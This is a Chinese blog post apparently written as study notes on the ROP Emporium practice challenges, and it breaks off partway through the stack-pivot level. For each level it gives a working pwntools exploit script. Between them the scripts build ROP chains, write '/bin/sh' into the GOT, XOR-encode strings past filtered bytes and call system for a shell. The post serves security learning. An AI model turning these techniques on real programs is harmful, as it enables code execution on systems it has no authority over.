<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>ROPEmporium 学习 - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。"><meta property="og:type" content="blog"><meta property="og:title" content="ROPEmporium 学习"><meta property="og:url" content="https://signormercurio.me/post/ROPEmporium/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://i.loli.net/2020/08/19/tR2x7DTpVXCOu1H.png"><meta property="article:published_time" content="2019-12-09T07:02:43.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="栈迁移"><meta property="article:tag" content="ROP"><meta property="article:tag" content="ret2csu"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://i.loli.net/2020/08/19/tR2x7DTpVXCOu1H.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/ROPEmporium/"},"headline":"Lab on Mercury","image":["https://i.loli.net/2020/08/19/tR2x7DTpVXCOu1H.png"],"datePublished":"2019-12-09T07:02:43.000Z","author":{"@type":"Person","name":"Mercury"},"description":"针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。"}</script><link rel="canonical" href="https://signormercurio.me/post/ROPEmporium/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="https://i.loli.net/2020/08/19/tR2x7DTpVXCOu1H.png" alt="ROPEmporium 学习"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-12-09T07:02:43.000Z" title="2019-12-09T07:02:43.000Z">2019-12-09</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Pwn/">Pwn</a></span><span class="level-item">21 minutes read (About 3077 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">ROPEmporium 学习</h1><div class="content"><p>针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。</p>
<a id="more"></a>

<h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>最简单的<code>ret2text</code>，给了到<code>ebp</code>的偏移量，只需要找到函数<code>ret2win</code>的地址返回过去即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(elf.symbols[<span class="string">&#x27;ret2win&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>拆开了<code>system</code>和<code>/bin/cat flag.txt</code>，因此找到两者地址，准备好参数后返回到<code>system</code>上即可。</p>
<p>注意在 32 位上，只需要先放<code>system</code>地址，随后填充 4 字节返回地址，再放<code>/bin/cat flag.txt</code>地址即可。而 64 位上传参需要控制<code>rdi</code>寄存器，因此需要<code>pop rdi; ret</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400883</span></span><br><span class="line">bin_cat_flag = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, pop_rdi_ret, bin_cat_flag, elf.plt[<span class="string">&#x27;system&#x27;</span>]])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>题目要求是依次调用<code>callme_one(1,2,3)</code>，<code>callme_two(1,2,3)</code>，<code>callme_three(1,2,3)</code>。要控制三个参数就需要三个寄存器<code>rdi rsi rdx</code>，我们恰好能找到一条语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</span><br></pre></td></tr></table></figure>

<p>之后就是布置好参数了：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi_rdx_ret = <span class="number">0x401ab0</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, pop_rdi_rsi_rdx_ret, <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, elf.plt[<span class="string">&#x27;callme_one&#x27;</span>], pop_rdi_rsi_rdx_ret, <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, elf.plt[<span class="string">&#x27;callme_two&#x27;</span>], pop_rdi_rsi_rdx_ret, <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, elf.plt[<span class="string">&#x27;callme_three&#x27;</span>]])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p><code>/bin/cat flag.txt</code>字符串彻底消失了，题目提示我们需要自己向内存中写入该字符串。<code>checksec</code>可知 GOT 表可写。</p>
<p>为了写 GOT 表，首先要控制寄存器，然后通过<code>mov [reg], reg</code>这样的语句来执行写操作，因此我们搜索一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary write4 --only <span class="string">&#x27;mov|pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x0000000000400821 : mov dword ptr [rsi], edi ; ret</span><br><span class="line">0x00000000004007ae : mov eax, 0 ; pop rbp ; ret</span><br><span class="line">0x0000000000400820 : mov qword ptr [r14], r15 ; ret</span><br><span class="line">0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400890 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400892 : pop r15 ; ret</span><br><span class="line">0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret</span><br><span class="line">0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400893 : pop rdi ; ret</span><br><span class="line">0x0000000000400891 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br></pre></td></tr></table></figure>

<p>按照上述需求，我们可以选择布置好栈，执行<code>pop r14 ; pop r15 ; ret</code>控制<code>r14</code>和<code>r15</code>，随后<code>mov qword ptr [r14], r15 ; ret</code>进行写操作，最后<code>pop rdi ; ret</code>把写好的<code>/bin/sh</code>（总觉得拿到 shell 比读到 flag 更厉害一点）作为参数传入，需要注意的是字符串需要 8 字节对齐。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_start = <span class="number">0x601000</span></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400890</span></span><br><span class="line">mov_r14_r15_ret = <span class="number">0x400820</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400893</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, pop_r14_r15_ret, got_start, <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>), mov_r14_r15_ret, pop_rdi_ret, got_start, elf.plt[<span class="string">&#x27;system&#x27;</span>]])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>题目屏蔽了一些关键字符，并提示了<code>XOR</code>，也就是说我们可以先写入被异或的关键字符，随后通过 gadgets 把它们异或回来。</p>
<p>题目告诉了我们被屏蔽的字符，所以我们可以先通过<code>--badbytes</code>选项避免指令地址中含有这些字符：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary badchars --only <span class="string">&#x27;mov|pop|ret&#x27;</span> --badbytes <span class="string">&#x27;62|69|63|2f|20|66|6e|73&#x27;</span></span><br></pre></td></tr></table></figure>

<p>随后，我们构造异或字符串，与 2 异或即可：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">ord</span>(s[i]) ^ <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin_sh = <span class="number">0x026a712d6c6b602d</span></span><br></pre></td></tr></table></figure>

<p>注意后面会被认为是小端法，所以这里倒序写。</p>
<p>然后，我们挑选如下的 gadgets：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop r12 ; pop r13 ; ret</span><br><span class="line">mov qword ptr [r13], r12 ; ret</span><br><span class="line"></span><br><span class="line">pop r14 ; pop r15 ; ret</span><br><span class="line">xor byte ptr [r15], r14b ; ret</span><br><span class="line"></span><br><span class="line">pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>第 1,2,5 行和前面一样，而第 3-4 行控制寄存器<code>r14</code>和<code>r15</code>的值，使得<code>r14=2</code>（<code>r14b</code>即<code>r14</code>的低 8 位），<code>r15</code>存放我们刚刚写入的被异或的字符串地址，随后进行 8 次异或即可恢复出<code>/bin/sh\x00</code>来。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x026a712d6c6b602d</span></span><br><span class="line">got_start = <span class="number">0x601000</span></span><br><span class="line">pop_r12_r13_ret = <span class="number">0x400b3b</span></span><br><span class="line">mov_r13_r12_ret = <span class="number">0x400b34</span></span><br><span class="line"></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400b40</span></span><br><span class="line">xor_r15_r14b_ret = <span class="number">0x400b30</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400b39</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	payload += flat([pop_r14_r15_ret, <span class="number">2</span>, got_start+i, xor_r15_r14b_ret])</span><br><span class="line"></span><br><span class="line">payload += flat([pop_rdi_ret, got_start, elf.plt[<span class="string">&#x27;system&#x27;</span>]])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>本题减少了一些 gadget，我们不得不间接地通过寄存器写内存。注意这里用 ROPgadget 很难找到合适的 gadget，需要加个<code>--depth</code>参数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary fluff --depth 20</span><br></pre></td></tr></table></figure>

<p>在众多 gadget 中要找到有用的，我们的思路还是如何去写内存。按照之前经验，还是需要<code>mov [reg], reg</code>的语句，这里就有一个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span><br></pre></td></tr></table></figure>

<p>但是很不巧，没有<code>pop r10; pop r11; ret</code>这么好的 gadget 了，我们只能另辟蹊径去控制这两个寄存器。首先我们要把 GOT 表地址放进<code>r10</code>。然而我们连<code>xor r10, reg</code>这样的语句都没有，非常难受（<code>xor [r10], reg</code>是没有用的，因为无法改变<code>r10</code>本身）。</p>
<p>但是我们注意到，有这样一个 gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span><br></pre></td></tr></table></figure>

<p>这里可以交换<code>r11</code>和<code>r10</code>的值，那么我们是不是可以通过控制<code>r11</code>，然后最后让它和<code>r10</code>交换从而控制<code>r10</code>呢？</p>
<p>我们发现是可以的，因为有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span><br><span class="line">0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span><br></pre></td></tr></table></figure>

<p>这两个 gadget 让我们想到：我们可以先通过第一个 gadget 清零<code>r11</code>，然后用第二个 gadget 让<code>r11</code>和<code>r12</code>异或，此时就等同于<code>mov r11, r12</code>了。而<code>r12</code>是很好控制的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret</span><br></pre></td></tr></table></figure>

<p>这样就可以构造 ROP 链先把地址写入<code>r10</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">got_start = <span class="number">0x601000</span></span><br><span class="line">xor_r11_r11 = <span class="number">0x400822</span></span><br><span class="line">pop_r12 = <span class="number">0x400832</span></span><br><span class="line">xor_r11_r12 = <span class="number">0x40082f</span></span><br><span class="line">xchg_r11_r10 = <span class="number">0x400840</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>, xor_r11_r11, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, pop_r12, got_start, xor_r11_r12, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, xchg_r11_r10, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>])</span><br></pre></td></tr></table></figure>

<p>这里的<code>&#39;a&#39;*8</code>是为了解决后面的无用<code>pop</code>。</p>
<p>第二步，向<code>r11</code>写入<code>/bin/sh\x00</code>，其实和上面同理：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload += flat([xor_r11_r11, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, pop_r12, <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>), xor_r11_r12, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>])</span><br></pre></td></tr></table></figure>

<p>第三步，向<code>r10</code>中的地址写入<code>r11</code>中的数据，需要注意的是由于该 gadget 后半部分会<code>pop r12</code>并且将<code>r12</code>也去和<code>r10</code>中的地址存放的值异或，此时我们必须控制<code>r12</code>为 0：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov_r10_r11 = <span class="number">0x40084e</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008c3</span></span><br><span class="line">payload += flat([mov_r10_r11, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, <span class="number">0</span>, pop_rdi_ret, got_start, elf.plt[<span class="string">&#x27;system&#x27;</span>]])</span><br></pre></td></tr></table></figure>

<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p><code>stack pivoting</code>就是在栈空间较小的情况下，把<code>esp</code>移到别的地方去，这样就能有更多空间写 ROP 链了。</p>
<p>这一关大意是要调用<code>libpivot.so</code>中的<code>ret2win</code>函数，也就是第一关的那个。此外，还有个<code>uselessFunction</code>里调用了<code>libpivot.so</code>里的<code>foothold_function</code>。</p>
<p>IDA 得到的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;64bits\n&quot;</span>);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000000</span>uLL);</span><br><span class="line">  pwnme(ptr + <span class="number">16776960</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">pwnme</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot.so&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send your second chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(a1, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now kindly send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>, <span class="number">256L</span>L);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到这里的<code>a1</code>会被打印出来，随后被<code>fgets</code>写入。我们想尝试让<code>rsp</code>指向<code>a1</code>来改变<code>rsp</code>位置。这个比较简单，只需要 gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">xchg rax, rsp; ret</span><br></pre></td></tr></table></figure>

<p>通过<code>pop rax</code>把<code>a1</code>的地址写入<code>rax</code>，然后交换，那么<code>rsp</code>就指向了<code>a1</code>，我们完成了<code>stack pivoting</code>。</p>
<p>这题容易搞混的地方是，我们的思路是先填<code>first stage</code>进行<code>stack pivoting</code>（也就是上述过程），再填<code>second stage</code>调用<code>ret2win</code>，但是程序中输入的顺序是相反的。</p>
<p>下面我们来看<code>second stage</code>，也就是考虑我们要先输入什么。我们最终肯定是想返回到<code>ret2win</code>，但是我们不知道它的地址。<code>checksec libpivot.so</code>可以发现还开启了 ASLR。因此可以想到这里<code>foothold_function</code>就是用来定位用的。</p>
<p>首先（通过<code>.plt</code>）调用一次<code>foothold_function</code>更新其<code>.got.plt</code>，随后将<strong>这个<code>.got.plt</code>项的地址</strong><code>pop</code>给<code>rax</code>，接着读取<code>[rax]</code>也就是<strong>这个<code>.got.plt</code>项的内容</strong>，即得到了<code>foothold_function</code>真实地址。</p>
